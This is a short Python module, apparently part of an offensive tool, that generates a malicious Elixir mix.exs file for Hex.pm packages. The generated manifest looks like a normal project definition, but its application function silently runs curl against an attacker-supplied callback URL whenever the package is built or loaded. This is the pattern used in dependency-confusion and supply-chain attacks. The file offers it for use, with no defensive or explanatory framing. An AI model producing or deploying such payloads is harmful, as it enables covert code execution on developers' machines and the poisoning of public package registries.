"""Generate Elixir payload for Hex.pm packages."""
from __future__ import annotations

from typing import Optional


def generate(package: str, callback: str, encode: Optional[str] = None) -> str:
    """Return a simple mix.exs executing ``callback``."""
    cmd = f"curl -m5 {callback}"
    return (
        f"defmodule {package.capitalize()}MixProject do\n"
        "  use Mix.Project\n"
        "  def project do\n"
        f"    [app: :{package}, version: '0.1.0']\n  end\n"
        "  def application do\n"
        f"    Mix.shell().cmd('{cmd}')\n    [extra_applications: [:logger]]\n  end\nend\n"
    )
